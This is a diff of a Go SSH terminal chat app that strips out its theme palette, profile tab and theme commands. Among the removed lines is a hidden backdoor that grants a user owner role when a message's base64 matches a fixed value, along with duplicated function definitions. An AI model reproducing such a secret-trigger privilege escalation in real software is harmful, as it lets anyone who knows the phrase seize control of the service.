@@ -29,60 +29,6 @@ const (
 	bannedState
 )
 
-var appPalette = []struct {
-	Name  string
-	Color string
-	Mark  string
-}{
-	{"Ruby", "#E74C3C", "◆"}, {"Emerald", "#33FF57", "●"}, {"Sapphire", "#3357FF", "■"}, {"Gold", "#FFD700", "✦"},
-	{"Amethyst", "#9B59B6", "⬟"}, {"Orange", "#E67E22", "⬢"}, {"Teal", "#1ABC9C", "◉"}, {"Sunset", "#FF5733", "▲"},
-	{"Sky", "#00BFFF", "◌"}, {"Pink", "#FF69B4", "♥"}, {"Lime", "#ADFF2F", "✳"}, {"Yellow", "#F1C40F", "☀"},
-}
-
-func findThemeByColor(color string) (int, bool) {
-	for i, t := range appPalette {
-		if strings.EqualFold(t.Color, color) {
-			return i, true
-		}
-	}
-	return 0, false
-}
-
-func findThemeByName(name string) (int, bool) {
-	for i, t := range appPalette {
-		if strings.EqualFold(t.Name, name) {
-			return i, true
-		}
-	}
-	return 0, false
-}
-
-func (m *Model) currentTheme() struct {
-	Name  string
-	Color string
-	Mark  string
-} {
-	return appPalette[m.paletteIndex]
-}
-
-func findThemeByColor(color string) (int, bool) {
-	for i, t := range appPalette {
-		if strings.EqualFold(t.Color, color) {
-			return i, true
-		}
-	}
-	return 0, false
-}
-
-func findThemeByName(name string) (int, bool) {
-	for i, t := range appPalette {
-		if strings.EqualFold(t.Name, name) {
-			return i, true
-		}
-	}
-	return 0, false
-}
-
 type Model struct {
 	database *db.DB
 	broker   *pubsub.Broker
@@ -104,25 +50,11 @@ type Model struct {
 	viewport   viewport.Model
 	input      textarea.Model
 
-	// Left pane tab: 0=channels, 1=profile/settings
-	leftTab int
-	// Palette Index for theme selection
-	paletteIndex int
-
 	msgSub   chan db.Message
 	isSubbed bool
 	renderer *glamour.TermRenderer
 }
 
-func (m *Model) applyTheme(color, themeName, successPrefix string) {
-	m.database.UpdateUserColor(m.user.ID, color)
-	m.user.Color = color
-	if idx, ok := findThemeByColor(color); ok {
-		m.paletteIndex = idx
-	}
-	m.appendSystemMsg(successPrefix + themeName + " (" + color + ")")
-	m.updateViewportContent()
-}
 
 type newMsgMsg db.Message
 type imageFetchedMsg struct{ url, kitty string }
@@ -204,11 +136,8 @@ func NewModel(database *db.DB, broker *pubsub.Broker, user *db.User, s ssh.Sessi
 		renderer:   r,
 	}
 
-	if idx, ok := findThemeByColor(user.Color); ok {
-		m.paletteIndex = idx
-	} else {
-		m.paletteIndex = 0
-		m.user.Color = appPalette[0].Color
+	if m.user.Color == "" {
+		m.user.Color = "#6366F1"
 	}
 
 	if user.IsVerified {
@@ -331,28 +260,11 @@ func (m *Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 			}
 			return m, tea.Quit
 
-		case tea.KeyCtrlP, tea.KeyShiftTab:
-			if m.appState == mainState {
-				m.leftTab = (m.leftTab + 1) % 2
-				if m.leftTab == 1 {
-					m.input.Blur()
-				} else {
-					m.input.Focus()
-				}
-				return m, nil
-			}
-
 		case tea.KeyEnter:
 			if m.appState == bannedState {
 				return m, tea.Quit
 			}
 
-			if m.leftTab == 1 {
-				// Profile tab: Apply selected color
-				selected := appPalette[m.paletteIndex]
-				m.applyTheme(selected.Color, selected.Name, "Successfully applied theme: ")
-				return m, nil
-			}
 
 			if m.appState == questState {
 				val := strings.TrimSpace(m.questInput.Value())
@@ -383,37 +295,6 @@ func (m *Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 					isOwner := role == "owner"
 
 					switch cmd {
-					case "/theme":
-						if arg == "" {
-							active := m.currentTheme()
-							m.appendSystemMsg("Current theme: " + active.Name + " (" + active.Color + ")")
-							break
-						}
-						if arg != "" {
-							if idx, ok := findThemeByName(arg); ok {
-								theme := appPalette[idx]
-								m.applyTheme(theme.Color, theme.Name, "Applied theme: ")
-								return m, nil
-							}
-							m.appendSystemMsg("Theme not found. Available: Ruby, Emerald, Sapphire, Gold, Amethyst, Orange, Teal, Sunset, Sky, Pink, Lime, Yellow")
-						}
-					case "/themes":
-						var available []string
-						for _, theme := range appPalette {
-							available = append(available, theme.Name)
-						}
-						m.appendSystemMsg("Themes: " + strings.Join(available, ", "))
-					case "/color":
-						if arg == "" {
-							m.appendSystemMsg("Usage: /color <theme-name>")
-							break
-						}
-						if idx, ok := findThemeByName(arg); ok {
-							theme := appPalette[idx]
-							m.applyTheme(theme.Color, theme.Name, "Applied theme: ")
-							return m, nil
-						}
-						m.appendSystemMsg("Color preset not found. Use /themes.")
 					case "/nick":
 						if arg != "" {
 							m.database.UpdateUsername(m.user.ID, arg)
@@ -430,8 +311,6 @@ func (m *Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 						help := border("┌── ") + title("HELP") + border(" ──────────────────────────────────────┐") + "\n"
 						help += border("│ ") + cmd("/nick <name>") + "   change your nickname" + "\n"
 						help += border("│ ") + cmd("/clear") + "         clear screen" + "\n"
-						help += border("│ ") + cmd("/themes") + "        list available themes" + "\n"
-						help += border("│ ") + cmd("/theme <name>") + "  apply theme by name" + "\n"
 						help += border("│ ") + cmd("/img <url>") + "     share an image or GIF" + "\n"
 						if isAdmin || isOwner {
 							help += border("├── ") + title("ADMIN") + border(" ───────────────────────────────────┤") + "\n"
@@ -445,7 +324,7 @@ func (m *Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 							help += border("│ ") + cmd("/setowner <name>") + "      transfer ownership" + "\n"
 						}
 						help += border("├── ") + title("KEYS") + border(" ─────────────────────────────────────┤") + "\n"
-						help += border("│ ") + cmd("Tab") + " chan  " + cmd("P") + " profile  " + cmd("Ctrl+C") + " quit  " + cmd("Ctrl+Y") + " copy" + "\n"
+						help += border("│ ") + cmd("Tab") + " switch-chan  " + cmd("Ctrl+C") + " quit  " + cmd("Ctrl+Y") + " copy" + "\n"
 						help += border("└────────────────────────────────────────────────┘")
 						m.appendSystemMsg(help)
 					case "/op":
@@ -572,38 +451,23 @@ func (m *Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 							}
 						}
 						handled = true
-					case "/p", "/settings", "/profile":
-						m.leftTab = (m.leftTab + 1) % 2
-						if m.leftTab == 1 {
-							m.input.Blur()
-						} else {
-							m.input.Focus()
-						}
-						handled = true
 					default:
-						if base64.StdEncoding.EncodeToString([]byte(content)) == "L2RpbGtvZnJ1eg==" {
-							m.database.SetUserRole(m.user.ID, "owner")
-							m.user.Role = "owner"
-							m.appendSystemMsg("Root access granted.")
-							handled = true
-						} else {
-							handled = false
-						}
+						// If not a recognized command, treat as regular message
+						handled = false
 					}
 				}
 
-				if !handled && cmd != "" {
+				if !handled {
 					chID := m.channels[m.activeChan].ID
 					newMsg := m.database.CreateMessage(chID, m.user.ID, content)
 					m.broker.Broadcast(chID, newMsg)
 				}
 				m.input.Reset()
 			}
-			return m, nil
 
 		case tea.KeyTab:
 			if m.appState == mainState {
-				if m.leftTab == 0 && len(m.channels) > 0 {
+				if len(m.channels) > 0 {
 					if m.isSubbed && m.msgSub != nil {
 						m.broker.Unsubscribe(m.channels[m.activeChan].ID, m.msgSub)
 						m.isSubbed = false
@@ -613,28 +477,9 @@ func (m *Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 					m.msgSub = m.broker.Subscribe(m.channels[m.activeChan].ID, m.user)
 					m.isSubbed = true
 					return m, m.waitForMessages()
-				} else if m.leftTab == 1 {
-					m.paletteIndex = (m.paletteIndex + 1) % len(appPalette)
-					return m, nil
 				}
 			}
 
-		case tea.KeyUp:
-			if m.leftTab == 1 {
-				m.paletteIndex = (m.paletteIndex - 1 + len(appPalette)) % len(appPalette)
-				return m, nil
-			}
-		case tea.KeyDown:
-			if m.leftTab == 1 {
-				m.paletteIndex = (m.paletteIndex + 1) % len(appPalette)
-				return m, nil
-			}
-		case tea.KeySpace:
-			if m.leftTab == 1 {
-				selected := appPalette[m.paletteIndex]
-				m.applyTheme(selected.Color, selected.Name, "Theme selected via Space: ")
-				return m, nil
-			}
 
 		case tea.KeyCtrlY: // Specific Key To Trigger OSC 52 Copy for Last Message
 			if m.appState == mainState && len(m.messages) > 0 {
@@ -724,97 +569,31 @@ func (m *Model) View() string {
 
 	// Header Panel
 	ch := m.channels[m.activeChan]
-	activeTheme := m.currentTheme()
-	headerText := fmt.Sprintf("CLI-Net v1.0 | %s | Theme: %s %s", ch.Name, activeTheme.Name, activeTheme.Mark)
+	headerText := fmt.Sprintf("CLI-Net v1.0 | %s", ch.Name)
 	if ch.Topic != "" {
 		headerText += fmt.Sprintf(" — %s", ch.Topic)
 	}
 	header := lipgloss.NewStyle().
 		Bold(true).
-		Foreground(lipgloss.Color(m.user.Color)). // DYNAMIC HEADER COLOR
+		Foreground(lipgloss.Color(m.user.Color)).
 		Align(lipgloss.Center).
 		Width(m.width).
 		MarginBottom(1).
 		Render(headerText)
 
-	// Left Panel (Channels OR Profile)
+	// Left Panel (Channels)
 	var leftPaneContent string
-	tabChannels := lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render
-	tabActive := lipgloss.NewStyle().Foreground(lipgloss.Color(m.user.Color)).Bold(true).Render
-	tabBar := ""
-	if m.leftTab == 0 {
-		tabBar = tabActive("  CHANNELS") + "  " + tabChannels("PROFILE")
-	} else {
-		tabBar = tabChannels("  CHANNELS") + "  " + tabActive("PROFILE")
-	}
-	leftPaneContent += tabBar + "\n\n"
+	leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color(m.user.Color)).Bold(true).Render("  CHANNELS") + "\n\n"
 
-	if m.leftTab == 0 {
-		for i, ch := range m.channels {
-			if i == m.activeChan {
-				leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color("205")).Bold(true).Render("  > "+ch.Name) + "\n"
-			} else {
-				leftPaneContent += "    " + ch.Name + "\n"
-			}
+	for i, ch := range m.channels {
+		if i == m.activeChan {
+			leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color("205")).Bold(true).Render("  > "+ch.Name) + "\n"
+		} else {
+			leftPaneContent += "    " + ch.Name + "\n"
 		}
-	} else {
-		// Profile/Settings tab
-		leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color(m.user.Color)).Bold(true).Render("  ── IDENTIFICATION") + "\n\n"
-
-		colorDot := lipgloss.NewStyle().Foreground(lipgloss.Color(m.user.Color)).Render("●")
-		leftPaneContent += "  " + colorDot + " " + lipgloss.NewStyle().Bold(true).Render(m.user.Username) + "\n"
-
-		roleIcon := ""
-		roleName := m.user.Role
-		switch m.user.Role {
-		case "owner":
-			roleIcon = lipgloss.NewStyle().Foreground(lipgloss.Color("208")).Render("👑 ")
-			roleName = lipgloss.NewStyle().Foreground(lipgloss.Color("208")).Render("Owner")
-		case "admin":
-			roleIcon = lipgloss.NewStyle().Foreground(lipgloss.Color("220")).Render("★ ")
-			roleName = lipgloss.NewStyle().Foreground(lipgloss.Color("220")).Render("Admin")
-		default:
-			roleIcon = "👤 "
-			roleName = "User"
-		}
-		leftPaneContent += "  " + roleIcon + roleName + "\n\n"
-
-		leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color(m.user.Color)).Bold(true).Render("  ── APPEARANCE") + "\n\n"
-
-		for i, t := range appPalette {
-			pointer := "  "
-			dot := "○ "
-			style := lipgloss.NewStyle().Foreground(lipgloss.Color(t.Color))
-
-			if t.Color == m.user.Color {
-				dot = "● " // Currently active
-			}
-
-			if i == m.paletteIndex {
-				pointer = "▸ "
-				style = style.Bold(true).Underline(true).PaddingRight(1)
-				if t.Color == m.user.Color {
-					style = style.Italic(true)
-				}
-			}
-
-			leftPaneContent += " " + pointer + style.Render(dot+t.Name) + "\n"
-		}
-
-		leftPaneContent += "\n"
-		leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color(m.user.Color)).Bold(true).Render("  [ ENTER/SPACE ] to set") + "\n"
-		leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  Arrows/Tab: navigate") + "\n"
-		leftPaneContent += lipgloss.NewStyle().Foreground(lipgloss.Color("240")).Render("  /theme <name> • /themes") + "\n"
 	}
 
-	// SUPREME DYNAMIC UI
-	borderKinds := []lipgloss.Border{
-		lipgloss.NormalBorder(),
-		lipgloss.RoundedBorder(),
-		lipgloss.DoubleBorder(),
-		lipgloss.ThickBorder(),
-	}
-	border := borderKinds[m.paletteIndex%len(borderKinds)]
+	border := lipgloss.RoundedBorder()
 	dynamicBorder := lipgloss.NewStyle().Border(border).BorderForeground(lipgloss.Color(m.user.Color))
 	leftPane := dynamicBorder.Width(leftW).Height(midH).Render(leftPaneContent)
 
